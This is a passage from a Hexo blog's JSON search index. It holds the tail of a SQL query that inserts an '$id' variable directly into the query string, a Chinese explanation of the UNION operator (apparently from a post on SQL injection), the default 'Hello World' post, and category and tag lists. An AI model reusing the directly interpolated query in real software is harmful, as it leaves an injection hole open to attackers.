&#x27;$id&#x27; LIMIT 0,1&quot;; UNION操作符介绍UNION操作符用于合并两个或多个SELECT语句的结果集。请注意，UNION内部的SELECT语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条SELECT语句中的列顺序必须相同。SQL UNION 语法SELECT column_name(s) FROM table_name1UNIONSELECT column_name(s) FROM table_name2另外，UNION结果集中列名总是等于UNION中的第一个SELECT语句中的列名。","categories":[],"tags":[],"author":"Dokey_"},{"title":"Hello World","slug":"hello-world","date":"2021-02-05T16:22:00.000Z","updated":"2023-03-25T14:35:06.445Z","comments":true,"path":"16107.html","link":"","permalink":"http://example.com/16107.html","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}],"categories":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/categories/Windows/"},{"name":"Golang","slug":"Golang","permalink":"http://example.com/categories/Golang/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://example.com/categories/MongoDB/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://example.com/categories/NodeJS/"},{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/categories/Windows-PE/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/categories/JavaScript/"},{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/categories/Windows-API/"},{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"http://example.com/tags/Windows/"},{"name":"Golang","slug":"Golang","permalink":"http://example.com/tags/Golang/"},{"name":"MongoDB","slug":"MongoDB","permalink":"http://example.com/tags/MongoDB/"},{"name":"NodeJS","slug":"NodeJS","permalink":"http://example.com/tags/NodeJS/"},{"name":"Windows PE","slug":"Windows-PE","permalink":"http://example.com/tags/Windows-PE/"},{"name":"windows Hook","slug":"windows-Hook","permalink":"http://example.com/tags/windows-Hook/"},{"name":"windows Inject","slug":"windows-Inject","permalink":"http://example.com/tags/windows-Inject/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"},{"name":"Windows API","slug":"Windows-API","permalink":"http://example.com/tags/Windows-API/"},{"name":"网络安全","slug":"网络安全","permalink":"http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]}